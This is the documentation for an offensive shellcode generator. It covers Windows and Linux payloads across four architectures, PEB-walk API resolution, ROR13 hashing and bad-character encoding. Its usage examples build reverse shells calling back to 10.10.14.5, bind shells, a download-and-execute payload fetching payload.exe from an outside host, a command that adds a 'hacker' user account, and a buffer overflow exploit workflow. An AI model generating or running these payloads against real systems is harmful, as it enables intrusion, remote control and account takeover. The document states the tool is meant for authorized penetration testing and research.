# Shellcode Generator - Technical Documentation

**Author:** Dawid Esterhuizen
**Purpose:** Multi-architecture shellcode generation with bad character avoidance

**⚠️ This tool has been refactored into a modular structure. See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for architecture details.**

## Overview

A comprehensive Python-based shellcode generator supporting multiple architectures and platforms. Designed for penetration testing and exploit development with automatic bad character encoding. The tool has been refactored from a monolithic script into a clean modular package structure for better maintainability and extensibility.

## Modular Architecture

The shellcode generator is now organized as a Python package with clear separation of concerns:

```
shellgen/
├── encoders.py          # Bad character encoding (encode_dword, encode_qword, ror13_hash)
├── assembler.py         # Assembly and verification (Keystone integration)
├── formatters.py        # Output formatters (ASM, Python, C, raw binary)
├── payloads.py          # High-level payload builders
├── cli.py               # Command-line interface
└── generators/          # OS-specific generators
    ├── windows.py       # Windows (x86/x64/ARM/ARM64) - PEB walk, API resolution
    └── linux.py         # Linux (x86/x64/ARM/ARM64) - Syscalls
```

See [MODULAR_STRUCTURE.md](MODULAR_STRUCTURE.md) for detailed module documentation.

## Features

### Supported Architectures
- **x86** (32-bit Intel/AMD)
- **x64** (64-bit Intel/AMD)
- **ARM32** (ARMv7-a)
- **ARM64** (AArch64)

### Supported Platforms
- **Windows** (x86/x64)
  - Robust PEB walk with kernel32.dll length check
  - InInitializationOrderModuleList optimization
  - Dynamic API resolution via GetProcAddress
  - ROR13 hash-based function lookup
  - LoadLibraryA for external DLLs

- **Linux** (ARM/ARM64)
  - Direct syscall implementation
  - Socket-based reverse shells
  - execve for command execution

### Payload Types

#### Windows Payloads
1. **messagebox** - Display MessageBox dialog
2. **winexec** - Execute arbitrary Windows commands via WinExec
3. **createprocess** - Execute commands via CreateProcessA (more flexible than WinExec)
4. **shellexecute** - Execute programs/URLs via ShellExecuteA (supports "open", "runas", etc.)
5. **system** - Execute commands via system() from msvcrt.dll (C runtime)
6. **download_exec** - Download file (URLDownloadToFile) and execute
7. **reverse_shell** - Native socket reverse shell (WSASocketA + connect + CreateProcessA with handle inheritance, runs in current process)
8. **reverse_shell_powershell** - PowerShell reverse shell (spawns child process, more reliable)

#### Linux Payloads
1. **execve** - Execute commands via syscall
   - Uses `/bin/sh -c` for command execution
   - Proper argv array construction

2. **reverse_shell** - Native TCP reverse shell
   - Creates socket via syscall
   - Connects to attacker host
   - Duplicates file descriptors (stdin/stdout/stderr)
   - Executes `/bin/sh`

### Output Formats
- **asm** - Assembly source code
- **python** - Python bytes string
- **c** - C-style char array
- **raw** - Raw binary shellcode
- **pyasm** - Python script with assembly code for Keystone

### Bad Character Encoding

For Windows x86/x64 payloads, the generator automatically avoids bad characters through:

1. **Subtraction Encoding**
   - Finds clean value pairs: `clean - offset = target`
   - Tries multiple increment strategies: `[1, 2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 0x101, 0x1001, 0x10001, 0x100001]`
   - Handles consecutive bad characters effectively

2. **Addition Encoding**
   - Splits values: `val1 + val2 = target`
   - Fallback when subtraction fails
   - Uses carefully chosen values to avoid bad chars

3. **Default Bad Characters:** `0x00, 0x0a, 0x0d` (NULL, LF, CR)

## Installation and Setup

### Virtual Environment (Recommended)

The project uses a Python virtual environment to isolate dependencies:

```bash
# Create virtual environment (if not exists)
python3 -m venv venv

# Install dependencies
source venv/bin/activate
pip install -r requirements.txt
```

### Zero-Configuration Usage with Wrapper Scripts

For convenience, wrapper scripts are provided that automatically use the venv without manual activation:

```bash
# Use wrapper scripts (no activation needed!)
./shellgen.sh --list-payloads
./hashgen.sh LoadLibraryA GetProcAddress

# These internally call:
# venv/bin/python shellgen_cli.py "$@"
# venv/bin/python hash_generator.py "$@"
```

See [USE_WITHOUT_ACTIVATE.md](USE_WITHOUT_ACTIVATE.md) for additional usage options including shell aliases and direnv setup.

## Usage Examples

### Zero-Configuration Usage (Recommended)
```bash
# Using wrapper scripts (no venv activation needed)
./shellgen.sh --platform windows --payload messagebox --title "Test" --message "Hello"
./hashgen.sh --format python LoadLibraryA GetProcAddress
```

### Linux ARM64 Command Execution
```bash
./shellgen_cli.py \
  --platform linux \
  --payload execve \
  --cmd "/bin/sh" \
  --arch arm64 \
  --format python
```

### Linux ARM32 Reverse Shell
```bash
./shellgen_cli.py \
  --platform linux \
  --payload reverse_shell \
  --host 10.10.14.5 \
  --port 443 \
  --arch arm
```

### Windows x86 Command Execution
```bash
./shellgen_cli.py \
  --platform windows \
  --payload winexec \
  --cmd "calc.exe" \
  --arch x86 \
  --bad-chars 00,0a,0d,20
```

### Windows x64 MessageBox
```bash
./shellgen_cli.py \
  --platform windows \
  --payload messagebox \
  --title "Pwned" \
  --message "Hello from shellcode!" \
  --arch x64
```

### Windows Download & Execute
```bash
./shellgen_cli.py \
  --platform windows \
  --payload download_exec \
  --url "http://10.10.14.5/payload.exe" \
  --save-path "C:\\temp\\p.exe" \
  --arch x86
```

### Windows CreateProcessA
```bash
./shellgen_cli.py \
  --platform windows \
  --payload createprocess \
  --cmd "cmd.exe /c whoami > C:\\output.txt" \
  --arch x86 \
  --show-window 0
```

### Windows ShellExecuteA
```bash
# Execute a program
./shellgen_cli.py \
  --platform windows \
  --payload shellexecute \
  --cmd "notepad.exe" \
  --arch x86

# Open a URL
./shellgen_cli.py \
  --platform windows \
  --payload shellexecute \
  --cmd "https://example.com" \
  --arch x86
```

### Windows system()
```bash
./shellgen_cli.py \
  --platform windows \
  --payload system \
  --cmd "net user hacker Passw0rd! /add" \
  --arch x86 \
  --bad-chars 00,0a,0d
```

### Custom Bad Characters
```bash
./shellgen_cli.py \
  --platform windows \
  --payload winexec \
  --cmd "notepad.exe" \
  --bad-chars 00,0a,0d,20,09 \
  --verify
```

### Output as C Array
```bash
./shellgen_cli.py \
  --platform linux \
  --payload execve \
  --cmd "whoami" \
  --arch arm64 \
  --format c \
  --output shellgen.c
```

## Command Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `--list-payloads` | List all available payloads | - |
| `--platform` | Target platform (windows, linux) | Required |
| `--payload` | Payload name | Required |
| `--arch` | Target architecture (x86, x64, arm, arm64) | x86 |
| `--format` | Output format (asm, python, c, raw, pyasm) | asm |
| `--bad-chars` | Comma-separated hex bytes to avoid | 00,0a,0d |
| `--title` | MessageBox title | - |
| `--message` | MessageBox message | - |
| `--cmd` | Command string for winexec/createprocess/shellexecute/system/execve | - |
| `--show-window` | Window visibility (0=hidden, 1=normal) | 1 |
| `--url` | URL for download_exec | - |
| `--save-path` | Save path for download_exec | - |
| `--host` | Listener IP for reverse_shell | - |
| `--port` | Listener port for reverse_shell | - |
| `--output` | Output filename | shellcode.asm |
| `--no-exit` | Skip ExitProcess at the end | False |
| `--verify` | Verify shellcode for bad characters | False |
ee| `--debug-shellcode` | Print opcodes line by line to identify bad characters | False |

## Technical Details

### Windows x86/x64 Shellcode Architecture

The Windows shellcode generator (`shellgen/generators/windows.py`) implements a robust and optimized approach supporting both x86 and x64 architectures with separate boilerplate implementations:

#### Architecture-Specific Implementations

**x86 (32-bit):**
- Accesses PEB via `fs:[0x30]`
- Uses `InInitializationOrderModuleList` at offset `0x1C`
- Saves kernel32.dll base in EBX
- Uses stack-based calling convention (stdcall)
- 4-byte pointer sizes

**x64 (64-bit):**
- Accesses PEB via `gs:[0x60]` (x64-specific offset)
- Uses `InLoadInitOrder` at offset `0x30` from PEB->Ldr
- Checks for "K" at string start (kernel32/kernelbase)
- Uses fastcall convention (RCX, RDX, R8, R9, then stack)
- Requires 32-byte shadow space for function calls
- 8-byte pointer sizes
- Module base stored at [rbp+0x20]

#### 1. PEB Walk with Robust kernel32.dll Detection

**x86 Implementation:**
   - Accesses Process Environment Block via `fs:[0x30]`
   - Navigates to `PEB->Ldr` at offset `0x0C`
   - Uses `InInitializationOrderModuleList` at offset `0x1C` (kernel32 is first)
   - **Robust Module Detection:**
     - Checks `BaseDllName.Length` at offset `0x1C` from module entry
     - Verifies length == 24 bytes (0x18) for "kernel32.dll" in Unicode
     - 12 characters × 2 bytes per character = 24 bytes
     - Iterates through modules until match found
   - Gets `DllBase` at offset `0x08` from module entry

**x64 Implementation:**
   - Accesses PEB via `gs:[0x60]` (x64 offset)
   - Navigates to `PEB->Ldr` at offset `0x18` (x64 structure)
   - Uses `InLoadInitOrder` at offset `0x30` from Ldr
   - **Robust Module Detection:**
     - Checks module name length == 12 characters (position 12*2 == 0x00)
     - Verifies first character is "K" (kernel32.dll or kernelbase.dll)
     - Works with both kernel32.dll and kernelbase.dll on modern Windows
   - Gets `DllBase` at offset `0x10` from module entry

#### 2. Export Table Parsing
   - Reads PE header at kernel32.dll base
   - Locates Export Address Table at offset `0x78` from PE header
   - Extracts:
     - `NumberOfNames` at offset `0x18`
     - `AddressOfNames` at offset `0x20`
     - `AddressOfNameOrdinals` at offset `0x24`
     - `AddressOfFunctions` at offset `0x1C`

#### 3. ROR13 Hash Resolution
   - Computes ROR13 hash for each exported function name
   - Hash algorithm:
     ```python
     h = 0
     for c in name:
         h = ((h >> 13) | (h << 19)) & 0xFFFFFFFF
         h = (h + ord(c)) & 0xFFFFFFFF
     ```
   - Known hashes:
     - `GetProcAddress`: `0x7c0dfcaa`
     - `LoadLibraryA`: `0xec0e4e8e`
   - Matches against target hash
   - Resolves function address via ordinal

#### 4. Dynamic API Loading

**x86:**
   - Uses stack-based hash lookup (push hash, call find_function)
   - LoadLibraryA called via `call dword ptr [ebp+0x08]`
   - API resolution via `call dword ptr [ebp+0x04]`
   - Registers after boilerplate:
     - `ebx` = kernel32.dll base address
     - `[ebp+0x04]` = find_function address
     - `[ebp+0x08]` = LoadLibraryA function pointer
     - `[ebp+0x10]` = kernel32.dll base (saved)

**x64:**
   - Uses register-based calling convention (EDX = hash, RDI = module base)
   - LoadLibraryA called via `call qword ptr [rbp+0x10]` with RCX = string pointer
   - API resolution via `call qword ptr [rbp+0x08]` (lookup_func)
   - Requires 32-byte shadow space before all API calls
   - Registers after boilerplate:
     - `[rbp+0x08]` = lookup_func address (via lea r15, [rel lookup_func])
     - `[rbp+0x10]` = LoadLibraryA function pointer
     - `[rbp+0x20]` = kernel32/kernelbase base address
   - Function returns address in RAX (x64 convention)

#### 5. String Consolidation
   - Identifies reused strings across API calls
   - Pushes once and caches pointer in register
   - Reduces shellcode size significantly

### Linux ARM/ARM64 Shellcode Architecture

The Linux shellcode generator (`shellgen/generators/linux.py`) implements direct syscalls supporting x86, x64, ARM, and ARM64 architectures:

#### 1. Direct Syscalls
   - **ARM32**: `swi #0` with syscall number in r7
   - **ARM64**: `svc #0` with syscall number in x8

#### 2. Key Syscalls Used
   - `execve` (ARM32: 11, ARM64: 221)
   - `socket` (ARM32: 281, ARM64: 198)
   - `connect` (ARM32: 283, ARM64: 203)
   - `dup2`/`dup3` (ARM32: 63, ARM64: 24)

#### 3. Register Usage
   - **ARM32**: r0-r2 for syscall arguments, r7 for syscall number
   - **ARM64**: x0-x2 for syscall arguments, x8 for syscall number

#### 4. Data Storage
   - Uses `adr` instruction for PC-relative addressing
   - Stores strings as `.asciz` directives
   - Builds argv arrays on stack for execve

## Assembly and Disassembly Requirements

The modular version uses **Keystone Engine** for assembly and **Capstone Engine** for disassembly/debugging.

### Keystone Engine (Assembly)
```bash
pip install keystone-engine
```
- Converts assembly code → machine code (binary)
- Supports all architectures (x86, x64, ARM, ARM64)
- Pure Python integration
- LLVM-based infrastructure

### Capstone Engine (Disassembly)
```bash
pip install capstone
```
- Converts machine code (binary) → assembly code
- Required for `--debug-shellcode` mode
- Provides accurate instruction-to-byte mapping
- Works with all architectures (x86, x64, ARM, ARM64)
- LLVM-based, pairs perfectly with Keystone

## Using as a Python Library

The modular structure makes it easy to use as a library:

### Example 1: Generate Windows MessageBox
```python
from src.generators import WindowsGenerator
from src.payloads import windows_messagebox
from src.assembler import assemble_to_binary

# Build payload config
config = windows_messagebox(
    title="Pwned",
    message="Hello!",
    bad_chars={0x00, 0x0a, 0x0d}
)

# Generate assembly for x86
generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)

# Assemble to binary
shellcode = assemble_to_binary(asm_code, arch='x86')
print(f"Shellcode: {len(shellcode)} bytes")
```

### Example 2: Generate Linux ARM64 Reverse Shell
```python
from src.generators import LinuxGenerator

# Create generator for ARM64
generator = LinuxGenerator(bad_chars={0x00}, arch='arm64')

# Build config
config = {
    'payload': 'reverse_shell',
    'host': '10.10.14.5',
    'port': 443,
    'bad_chars': {0x00}
}

# Generate assembly
asm_code = generator.generate(config)
```

### Example 3: Custom Windows Payload
```python
from src.generators import WindowsGenerator

# Define custom API calls
config = {
    'bad_chars': {0x00, 0x0a, 0x0d},
    'calls': [
        {
            'api': 'CreateFileA',
            'dll': 'kernel32.dll',
            'args': ['C:\\test.txt', 0x40000000, 0, 0, 2, 0, 0]
        },
        {
            'api': 'WriteFile',
            'dll': 'kernel32.dll',
            'args': ['REG:eax', 'Hello World!', 12, 'REG:esp', 0]
        }
    ],
    'exit': True
}

generator = WindowsGenerator(config['bad_chars'], arch='x86')
asm_code = generator.generate(config)
```

## Verification and Debugging

### Verify Shellcode for Bad Characters

Use the `--verify` flag to check assembled shellcode for bad characters:

```bash
./shellgen_cli.py \
  --platform windows \
  --payload winexec \
  --cmd "calc.exe" \
  --bad-chars 00,0a,0d \
  --verify
```

The verification will:
- Assemble the shellcode using Keystone
- Scan for bad characters byte-by-byte
- Report locations and context of bad bytes (shows 4 bytes before and after)
- Provide debugging recommendations
- Exit with error code if bad chars found

### Debug Shellcode with Disassembly

Use the `--debug-shellcode` flag to disassemble and map bad characters to instructions:

```bash
./shellgen_cli.py \
  --platform windows \
  --payload winexec \
  --cmd "calc.exe" \
  --arch x86 \
  --bad-chars 00,0a,0d,20 \
  --debug-shellgen
```

The debug output uses **Capstone** to disassemble the assembled shellcode and includes:
- Complete disassembly of all instructions (accurate byte offsets)
- Assembled opcodes in hexadecimal format
- Bad characters highlighted in red (ANSI color codes)
- "!!!" marker for instructions containing bad characters
- Detailed mapping section showing which instructions contain bad chars
- Summary with recommendations for fixing

Example output:
```
================================================================================
SHELLCODE DEBUG MODE - Bad Character Analysis with Disassembly
================================================================================
Architecture: x86
Bad chars to avoid: {0x00, 0x0c, 0x20}
================================================================================

[+] Complete shellcode assembled: 225 bytes, 99 instructions

✗ Found 4 bad character(s) in the shellcode
Bad bytes: {0x0c, 0x20}

================================================================================
DISASSEMBLY WITH BAD CHARACTER HIGHLIGHTING
================================================================================

Offset       Size   Opcodes                                          Instruction
-----------------------------------------------------------------------------------------------
0x0000-0x0001 2      89 e5                                             mov ebp, esp
0x0002-0x0007 6      81 c4 f0 f9 ff ff                                 add esp, 0xfffff9f0
0x000e-0x0010 3      8b 76 0c                                    !!!   mov esi, dword ptr [esi + 0xc]
0x0072-0x0075 4      66 8b 0c 4a                                 !!!   mov cx, word ptr [edx + ecx*2]
...

================================================================================
BAD CHARACTER LOCATIONS MAPPED TO INSTRUCTIONS
================================================================================

Offset 0x000e: mov esi, dword ptr [esi + 0xc]
  Instruction range: 0x000e-0x0010 (3 bytes)
  Bad characters found:
    - Byte 0x0c at offset 0x0010 (byte 2 of instruction)
  Opcodes: 8b 76 [0c]

Offset 0x0072: mov cx, word ptr [edx + ecx*2]
  Instruction range: 0x0072-0x0075 (4 bytes)
  Bad characters found:
    - Byte 0x0c at offset 0x0074 (byte 2 of instruction)
  Opcodes: 66 8b [0c] 4a
```

This helps identify which specific instructions contain bad characters, making it easier to:
- **Pinpoint exact instructions** with bad chars (not just byte offsets)
- See which **byte position** within the instruction contains bad chars
- Understand if bad chars are in **opcodes, ModR/M bytes, or SIB bytes**
- **Fix instructions manually** by using alternative register combinations or instruction forms
- Example fix: Replace `mov cx, [edx+ecx*2]` with `lea esi, [edx+ecx*2]; mov cx, [esi]`

**Why Capstone?** The disassembly approach works perfectly even with forward jumps and labels, providing accurate mapping of every byte to its instruction. The previous incremental assembly approach would fail when encountering forward references.

## Output Examples

### Assembly (ASM) Format
```nasm
; ==========================================================================
; Auto-generated x86 Windows Shellcode
; Bad chars: {0x00, 0x0a, 0x0d}
; ==========================================================================

_start:
    cld
    xor ecx, ecx
    mov eax, fs:[0x30]
    ; ... PEB walk code ...
```

### Python Format
```python
# Shellcode generated by Shellcode Generator
# Length: 287 bytes
# Architecture: arm64
# Platform: linux

shellcode = b"\x21\x00\x80\xd2\x01\x00\x00\x8b..."
```

### C Format
```c
// Shellcode generated by Shellcode Generator
// Length: 287 bytes
// Architecture: arm64
// Platform: linux

unsigned char shellcode[] = {
    0x21, 0x00, 0x80, 0xd2, 0x01, 0x00, 0x00, 0x8b,
    // ...
};
unsigned int shellcode_len = 287;
```

## Key Improvements in Modular Version

1. **Modularity**: Clean separation of concerns
   - Generators are architecture-specific
   - Encoders handle bad character logic
   - Assemblers integrate with Keystone
   - Formatters handle all output formats
   - Payloads provide high-level builders

2. **Maintainability**: Easier to add new features
   - Add new payloads in `payloads.py`
   - Create new generators in `generators/`
   - Extend CLI in `cli.py`

3. **Testability**: Each module can be tested independently
   - Unit test individual encoders
   - Test generators with mock configs
   - Verify assembler with known inputs

4. **Reusability**: Library usage is straightforward
   - Import specific generators
   - Build custom payloads programmatically
   - Integrate into exploit frameworks

5. **Consistency**: Unified interface across platforms
   - Common CLI arguments
   - Standardized configuration format
   - Consistent error handling

## Limitations

1. **Windows ARM/ARM64** - Not implemented (uses different conventions)
2. **Linux x86/x64** - Not yet implemented (use ARM/ARM64)
3. **Bad Character Encoding** - Only for Windows x86/x64 payloads
4. **Complex Payloads** - Some edge cases may need manual adjustment

## Security Considerations

This tool is designed for **authorized security testing only**. Use cases include:

- Penetration testing engagements
- Exploit development research
- Defensive security training
- Red team operations
- CTF competitions

**Do not use** for:
- Unauthorized access to systems
- Malware development
- Any illegal activities

## Example Workflow

### Developing an Exploit for ARM IoT Device

1. **Generate initial shellcode**
   ```bash
   ./shellgen_cli.py \
     --platform linux \
     --payload reverse_shell \
     --host 192.168.1.100 \
     --port 4444 \
     --arch arm \
     --format python \
     --output shellgen.py
   ```

2. **Test in exploit script**
   ```python
   from shellgen import shellcode

   payload = b"A" * 264  # overflow to RIP
   payload += shellcode
   ```

3. **Adjust for bad characters**
   ```bash
   # If certain bytes cause issues
   ./shellgen_cli.py \
     --platform linux \
     --payload reverse_shell \
     --host 192.168.1.100 \
     --port 4444 \
     --arch arm \
     --bad-chars 00,0a,0d,20
   ```

4. **Optimize shellcode size**
   - Use `--no-exit` if exit handling not needed
   - Choose minimal commands
   - Use raw format for smallest size

## Troubleshooting

### "No module named 'keystone'"
Install Keystone: `pip install keystone-engine`

### "Cannot encode 0x... avoiding bad chars"
The encoder couldn't find clean values. Try:
- Reducing bad character restrictions
- Using different payload type
- Manual encoding of problematic values

### "Unsupported platform/arch combination"
Check compatibility:
- Windows: x86, x64
- Linux: arm, arm64

## References

- [PEB Walk Technique](https://en.wikipedia.org/wiki/Process_Environment_Block)
- [ROR13 Hash Algorithm](https://www.fireeye.com/blog/threat-research/2019/10/api-hashing-tool.html)
- [ARM Syscall Numbers](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)
- [Keystone Engine](http://www.keystone-engine.org/)
- [Modular Structure Details](MODULAR_STRUCTURE.md)

## File Structure

```
shellcode/
├── shellgen/                # Main package
│   ├── __init__.py
│   ├── encoders.py
│   ├── assembler.py
│   ├── formatters.py
│   ├── payloads.py
│   ├── cli.py
│   └── generators/
│       ├── __init__.py
│       ├── windows.py       # Windows (x86/x64/ARM/ARM64)
│       └── linux.py         # Linux (x86/x64/ARM/ARM64)
├── shellgen_cli.py          # Main entry point
├── CLAUDE.md                # This documentation
├── MODULAR_STRUCTURE.md     # Modular architecture details
├── README.md                # User guide
└── shellcode.py             # DEPRECATED - Legacy script
```

## Contributing

When modifying this tool:
1. Maintain OS-specific generator structure (windows.py, linux.py)
2. Add architecture support by extending existing generators
3. Add new payloads to `shellgen/payloads.py`
4. Test with various bad character combinations
5. Verify syscall numbers for ARM/ARM64
6. Update documentation for new features
7. Add examples for new payload types

## Version History

- **v1.0** - Initial x86 Windows support
- **v2.0** - Added ARM/ARM64 Linux support
  - ARM32/ARM64 execve payloads
  - ARM32/ARM64 reverse shells
  - Multi-architecture assembly support
  - Improved bad character encoding
- **v3.0** - Modular refactoring
  - Complete package restructuring
  - Separate generators for x86 Windows and ARM Linux
  - Robust PEB walk with kernel32 length check
  - InInitializationOrderModuleList optimization
  - LoadLibraryA for external DLL support
  - High-level payload builders
  - Library usage support
  - Improved maintainability and extensibility
- **v3.1** - OS-specific generator architecture
  - Refactored generators to be OS-specific (windows.py, linux.py)
  - Each generator accepts architecture as parameter
  - Unified interface: WindowsGenerator(bad_chars, arch='x86')
  - Unified interface: LinuxGenerator(bad_chars, arch='x86')
  - Cleaner separation: OS determines API/syscalls, arch determines encoding
  - Easier to extend with new architectures per platform
- **v3.2** - Enhanced Windows payload support
  - Added CreateProcessA payload (more flexible process creation)
  - Added ShellExecuteA payload (execute programs/URLs with verbs)
  - Added system() payload (C runtime command execution via msvcrt.dll)
  - Extended CLI argument handling for new payloads
  - Updated documentation with new payload examples
- **v3.3** - Reverse shell improvements and bug fixes
  - Fixed critical string argument handling bug (multiple string args were overwriting each other)
  - Implemented string pointer preservation using registers (EDI, ESI, EDX)
  - Added native socket reverse shell (reverse_shell) - runs in current process
  - Added PowerShell reverse shell (reverse_shell_powershell) - more reliable
  - Added support for custom assembly blocks in generator
  - Native reverse shell uses WSASocketA + connect + CreateProcessA with handle redirection
  - Properly builds sockaddr_in and STARTUPINFOA structures on stack
- **v3.4** - Debug mode and reverse shell fixes
  - Added `--debug-shellcode` flag for line-by-line opcode analysis
  - Debug mode shows opcodes, highlights bad characters, and provides detailed summaries
  - Fixed reverse shell to wait for shell process via WaitForSingleObject
  - Prevents premature socket handle closure by keeping parent process alive
  - Fixed CLI exit handling to respect payload-specific exit requirements
  - Native reverse shell now properly attaches terminal to socket
  - Removed broken SetHandleInformation call that caused access violations (incorrect hash)
  - Socket handles are inheritable by default from WSASocketA, no additional API call needed
  - Simplified reverse shell implementation for better reliability
- **v3.5** - Windows x64 architecture support
  - **Complete x64 support implemented** - all Windows payloads now work for x64
  - Implemented x64 boilerplate with gs:[0x60] PEB access (gen_boilerplate_x64)
  - Added x64 API resolution with register-based calling (gen_resolve_function_x64)
  - Implemented x64 DLL loading with fastcall convention (gen_load_dll_x64)
  - **Full x64 API calling with fastcall convention** (gen_api_call_preresolve_x64)
    - First 4 args via RCX, RDX, R8, R9 registers
    - Additional args pushed on stack in reverse order
    - 32-byte shadow space allocation for all function calls
    - Proper stack cleanup after calls
  - **x64 clean exit via TerminateProcess** (gen_exit_shellcode_x64)
    - GetCurrentProcess and TerminateProcess with fastcall convention
    - Shadow space handling for both API calls
  - x64 uses 8-byte pointer offsets vs x86's 4-byte offsets
  - Lookup function uses register-based calling (RDI=module base, EDX=hash)
  - Supports both kernel32.dll and kernelbase.dll via "K" prefix check
  - Architecture dispatch system: all generator methods check self.arch and call appropriate x86/x64 variant
  - Updated gen_pre_resolve_apis() to handle x64 pointer sizing
- **v3.6** - Enhanced debug mode with Capstone disassembly
  - **Complete rewrite of `--debug-shellcode` using Capstone Engine**
  - Disassembly-based approach replaces incremental assembly method
  - Fixes issues with forward jumps and label references
  - Provides accurate instruction-to-byte mapping for all instructions
  - Shows exact byte position of bad characters within each instruction
  - Highlights bad characters in red with detailed mapping section
  - Maps bad chars to disassembled instructions (not just source lines)
  - Added Capstone as required dependency for debug mode
  - Updated documentation with Keystone vs Capstone explanation
  - Added helper function `get_capstone_arch_mode()` for architecture mapping
  - Debug output now shows which byte of the instruction contains bad chars
  - Provides actionable recommendations for fixing (e.g., use LEA + MOV instead of scaled index)
  - Works flawlessly with complex shellcode containing jumps, calls, and labels
- **v3.7** - ColorPrinter Integration and Visual Output Enhancement
  - **Migrated to shared `lib/color_printer` library** for consistent colored output across all pentest tools
  - **Phase 5: Visual Features**
    - Added `print_panel()` method to ColorPrinter for Rich Panel boxes (green=success, yellow=warning, cyan=info)
    - Added `print_hex_preview()` method for hex dumps with ASCII representation
    - Added `print_table()` method for Rich Tables with colored cells
    - Assembly now shows progress indicator: "⚙ Assembling shellcode with Keystone Engine..."
    - Assembly success wrapped in green panel showing size, instruction count
    - Added hex preview of first 16 bytes after successful assembly
    - Completely rewrote `print_bad_char_summary()` with Rich Panels:
      - Green panel for clean scans: "✓ Bad Character Scan - CLEAN"
      - Yellow warning panel for detected bad chars with detailed breakdown
      - Cyan recommendation panel with helpful tips for fixing issues
    - API hash display converted from stderr to colored cyan panel on stdout
  - **Phase 6: Enhanced Payload Listing**
    - Extended PAYLOADS dict from 2-tuple to 3-tuple: `(function, description, [supported_archs])`
    - Completely rewrote `list_payloads()` function with rich visual output:
      - Architecture support displayed inline with each payload: `[x86, x64]`
      - Two architecture compatibility matrices (Windows and Linux) using Rich Tables
      - Green checkmarks (✓) for supported architectures, red X (✗) for unsupported
      - Examples section with 4 common usage patterns (colored command syntax)
      - Quick tips panel with helpful reminders
    - Updated `get_payload_builder()` to extract function from new 3-tuple structure
  - **Phase 7: Error/Warning Styling Audit**
    - Reviewed all error messages and warnings for consistent styling
    - Determined most work already done in earlier phases (Phase 2)
    - All success messages, error messages, and tips now use ColorPrinter methods
  - **Phase 8: Documentation Updates**
    - Updated README.md with "Visual Features & Output Enhancement" section
    - Documented all new visual features: panels, progress indicators, hex previews, tables
    - Added architecture matrix examples and colored output behavior
    - Updated CLAUDE.md with complete Phase 5-7 changelog (this entry)
- **v3.7.1** - Bug Fixes
  - **Fixed**: `--bad-chars` CLI argument now properly overrides JSON `bad_chars` when using `--json`
    - Previously, when using `--json payload.json --bad-chars 00,0a,0d,20`, the CLI argument was ignored
    - Now displays which source is being used: "Using bad_chars from CLI (overriding JSON)" or "Using bad_chars from JSON"
    - CLI override only happens when `--bad-chars` differs from default value ('00')
  - **Enhancement**: Added Rich library to requirements.txt (was missing dependency)
  - **Documentation**: Updated README.md with CLI override behavior and examples
- **v3.8** - x64 Windows Enhancements and Fixes (current)
  - **Fixed x64 boilerplate RIP-relative addressing** (generators/windows.py:282)
    - Changed `lea r15, [rel lookup_func]` to `lea r15, [rip + lookup_func]`
    - Keystone requires `rip` syntax instead of `rel` for backward references
    - Moved `lookup_func` definition before `locate_funcs` to enable backward reference
  - **Made gen_push_string architecture-aware** (generators/windows.py:62-90)
    - Now uses 64-bit registers (`rcx`, `rsp`, `rax`) for x64 architecture
    - Previously used 32-bit registers (`ecx`, `esp`, `eax`) regardless of architecture
    - Fixes "Missing CPU feature" errors when assembling x64 shellcode
  - **Fixed stack allocation bugs in x64 payloads** (payloads.py)
    - `reverse_shell_x64`: Moved `sub rsp, 0x30` BEFORE writing to `[rsp+0x20]` and `[rsp+0x28]`
    - `reverse_shell_x64`: Moved `sub rsp, 0x50` BEFORE writing CreateProcessA stack arguments
    - `bind_shell_x64`: Applied same fixes for WSASocketA and CreateProcessA calls
    - Writing to stack memory before allocation caused undefined behavior
  - **Added bind_shell_x64 payload** (payloads.py)
    - Native TCP bind shell for x64 Windows
    - Uses WSASocketA + bind + listen + accept + CreateProcessA
    - Properly handles x64 fastcall convention and shadow space
    - Supports custom shell specification (default: cmd.exe)
  - **All Windows payloads now support x64**
    - messagebox, winexec, createprocess, shellexecute, system, download_exec
    - reverse_shell, reverse_shell_powershell, bind_shell (new)
    - Fully functional x64 PEB walk, API resolution, and calling convention
